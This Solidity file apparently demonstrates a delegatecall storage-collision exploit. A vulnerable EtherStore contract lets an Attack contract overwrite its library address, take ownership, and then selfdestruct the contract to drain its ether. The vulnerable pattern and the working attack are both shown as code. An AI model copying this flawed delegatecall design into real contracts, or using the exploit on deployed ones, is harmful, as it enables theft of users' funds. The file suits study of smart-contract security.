// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Lib {
    uint256 public num;

    function doSomething(uint256 _num) public {
        num = _num;
    }
}

contract EtherStore {
    address public lib;
    address public owner;
    uint256 public num;

    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function deposit() public payable {}

    function doSomething(uint256 _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }

    function gameover(address _contract) public payable onlyOwner {
        selfdestruct(payable(_contract));
    }
}

contract Attack {
    address public lib;
    address public owner;
    uint256 public num;

    EtherStore public etherStore;

    constructor(EtherStore _etherStore) {
        etherStore = EtherStore(_etherStore);
    }

    function attack() public {
        etherStore.doSomething(uint256(uint160(address(this))));
        etherStore.doSomething(1);
    }

    function attack2(address _contract) public {
        etherStore.gameover(_contract);
    }

    function doSomething(uint256 _num) public {
        owner = msg.sender;
    }
}

contract AttackStore {
    function getBalance() public returns (uint256) {
        return address(this).balance;
    }
}
